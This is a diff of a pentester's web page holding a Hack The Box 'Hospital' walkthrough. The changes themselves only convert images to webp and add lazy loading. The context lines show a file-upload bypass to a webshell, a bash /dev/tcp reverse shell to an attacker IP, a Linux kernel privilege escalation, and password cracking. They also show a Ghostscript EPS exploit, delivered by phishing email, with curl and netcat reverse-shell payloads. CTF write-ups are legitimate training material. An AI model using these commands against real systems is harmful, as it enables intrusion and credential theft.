@@ -16,7 +16,7 @@
     <header class="spine">
         <div class="spine-id">
             <a class="si-id" href="../index.html" aria-label="Frédéric Goossens - Home">
-                <span class="si-photo"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></span>
+                <span class="si-photo"><img src="../assets/images/pfp.webp" alt="Frédéric Goossens"></span>
                 <span class="si-prompt"><span class="sigil">$</span>whoami</span>
                 <span class="si-name">Frédéric Goossens</span>
                 <span class="si-roles"><span>Pentester</span><span>OSCP · BSCP</span></span>
@@ -41,7 +41,7 @@
     </header>
 
     <div class="topbar">
-        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></a>
+        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.webp" alt="Frédéric Goossens"></a>
         <div class="tb-actions">
             <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
             <button class="menu-btn" type="button" data-menu-open aria-label="Open menu" aria-controls="menu" aria-haspopup="dialog" aria-expanded="false">
@@ -52,7 +52,7 @@
 
     <div id="menu" role="dialog" aria-modal="true" aria-label="Navigation menu" aria-hidden="true" inert>
         <div class="menu-top">
-            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt=""><span>Frédéric Goossens</span></a>
+            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.webp" alt=""><span>Frédéric Goossens</span></a>
             <button class="close-btn" type="button" data-menu-close>Close ×</button>
         </div>
         <nav aria-label="Mobile">
@@ -410,12 +410,12 @@ result: 0 Success
 + 8858 requests: 0 error(s) and 11 item(s) reported on remote host
 + End Time:           2023-12-13 16:45:53 (GMT1) (1979 seconds)</code></pre>
 </div>
-</details><figure><img src="../assets/images/htb/hospital/01-untitled.png" alt=""></figure><p><code>http://10.10.11.241:8080/login.php</code> → hospital login </p><details>
+</details><figure><img src="../assets/images/htb/hospital/01-untitled.png" alt="" loading="lazy" decoding="async"></figure><p><code>http://10.10.11.241:8080/login.php</code> → hospital login </p><details>
 <summary>nikto scan</summary>
 <div class="inner">
 
 </div>
-</details><figure><img src="../assets/images/htb/hospital/02-untitled-1.png" alt=""></figure></div></details>
+</details><figure><img src="../assets/images/htb/hospital/02-untitled-1.webp" alt="" loading="lazy" decoding="async"></figure></div></details>
 
 <h2>Initial foodhold</h2>
 
@@ -441,12 +441,12 @@ Upgrade-Insecure-Requests: 1
 username=test&amp;password=test&amp;confirm_password=test</code></pre>
 </div>
 </details></li>
-<li>We now have access to the site<figure><img src="../assets/images/htb/hospital/03-untitled-2.png" alt=""></figure></li>
+<li>We now have access to the site<figure><img src="../assets/images/htb/hospital/03-untitled-2.webp" alt="" loading="lazy" decoding="async"></figure></li>
 <li>Try uploading a file</li>
 <li>Find out where it is uploaded<ol><li>Just guessed → <code>http://10.10.11.241:8080/uploads/&lt;filename&gt;</code></li></ol></li>
 <li>Upload a php file for a reverse shell<ol><li>bypass .php file upload restriction → seems .phar files work<figure><p><a href="https://book.hacktricks.xyz/pentesting-web/file-upload" target="_blank" rel="noopener noreferrer">File Upload</a></p></figure></li>
 <li>Using p0wnyshell<figure><p><a href="https://github.com/flozz/p0wny-shell/blob/master/shell.php" target="_blank" rel="noopener noreferrer">p0wny-shell · flozz/p0wny-shell</a></p></figure></li></ol></li>
-<li>We have a webshell as www-data<figure><img src="../assets/images/htb/hospital/04-untitled-3.png" alt=""></figure></li>
+<li>We have a webshell as www-data<figure><img src="../assets/images/htb/hospital/04-untitled-3.png" alt="" loading="lazy" decoding="async"></figure></li>
 <li>Upgrade php shell to bash<pre><code>nc -lvp 4444
 bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.10.16.6/4444 &lt;&amp;1'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -520,7 +520,7 @@ Codename:       lunar</code></pre>
 </div>
 </details><figure><p><a href="https://www.cvedetails.com/cve/CVE-2023-32629/" target="_blank" rel="noopener noreferrer">CVE-2023-32629 · CVE Details</a></p></figure></li></ol></li>
 <li>Try privilege escalation to root using <strong>CVE-2023-32629</strong><ol><li>I found a public exploit on github<p><a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629" target="_blank" rel="noopener noreferrer">https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629</a></p></li>
-<li>Run the exploit script<figure><img src="../assets/images/htb/hospital/05-untitled-4.png" alt=""></figure></li>
+<li>Run the exploit script<figure><img src="../assets/images/htb/hospital/05-untitled-4.png" alt="" loading="lazy" decoding="async"></figure></li>
 <li>We are root<details>
 <summary>mysql?</summary>
 <div class="inner">
@@ -669,7 +669,7 @@ Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 qwe123!@#        (drwilliams)
 1g 0:00:01:53 DONE (2023-12-13 18:41) 0.008834g/s 1893p/s 1893c/s 1893C/s raycharles..pucc</code></pre><blockquote>Found credentials <strong>drwilliams</strong>:<mark class="highlight-red" data-notion-highlight="red">qwe123!@#</mark></blockquote></li>
-<li>We can now ssh using drwilliams<figure><img src="../assets/images/htb/hospital/06-untitled-5.png" alt=""></figure></li></ol></li></ol>
+<li>We can now ssh using drwilliams<figure><img src="../assets/images/htb/hospital/06-untitled-5.png" alt="" loading="lazy" decoding="async"></figure></li></ol></li></ol>
 
 <h3>From WSL to Windows</h3>
 
@@ -677,7 +677,7 @@ qwe123!@#        (drwilliams)
 
 <blockquote>Using drwilliams credentials I am able to login on the webmail, where we find an interesting email.</blockquote>
 
-<figure><img src="../assets/images/htb/hospital/07-untitled-6.png" alt=""></figure>
+<figure><img src="../assets/images/htb/hospital/07-untitled-6.png" alt="" loading="lazy" decoding="async"></figure>
 
 <h4>Phishing attempt using an eps file</h4>
 
@@ -691,7 +691,7 @@ python3 CVE_2023_36664_exploit.py --inject --payload 'curl "http://10.10.16.6:88
 # Executes netcat binary for reverse shell
 python3 CVE_2023_36664_exploit.py --inject --payload 'nc64.exe 10.10.16.6 5555 -e cmd.exe' --filename sample2.eps</code></pre></li>
 <li>Start listener<pre><code>nc -lvp 5555</code></pre></li>
-<li>Send 2 emails to drbrown containing the .esp files, we can see the file gets downloaded and we receive a connection on our listener 🙂<figure><img src="../assets/images/htb/hospital/08-untitled-7.png" alt=""></figure></li>
+<li>Send 2 emails to drbrown containing the .esp files, we can see the file gets downloaded and we receive a connection on our listener 🙂<figure><img src="../assets/images/htb/hospital/08-untitled-7.png" alt="" loading="lazy" decoding="async"></figure></li>
 <li>In the Documents folder there is a ghostscript.bat file containing the user’s credentials<pre><code>@echo off
 set filename=%~1
 powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"</code></pre><blockquote><strong>hospital\drbrown</strong>:<mark class="highlight-red" data-notion-highlight="red">chr!$br0wn</mark></blockquote></li></ol>
@@ -749,7 +749,7 @@ File: C:\xampp\tmp\sess_4knvaje1nih9ntd1j6209o76vv</code></pre>
 
 <blockquote>Now that we have access to the other webserver, I tried uploading our previous php shell in the <code>C:\xampp\htdocs</code> folder to see under what permissions it would run.</blockquote>
 
-<figure><img src="../assets/images/htb/hospital/09-untitled-8.png" alt=""></figure>
+<figure><img src="../assets/images/htb/hospital/09-untitled-8.png" alt="" loading="lazy" decoding="async"></figure>
 
 <p>Found root <strong>flag</strong> → <mark class="highlight-teal" data-notion-highlight="teal">32b490f913b5fd09b6facaedc92c5146</mark></p>
 
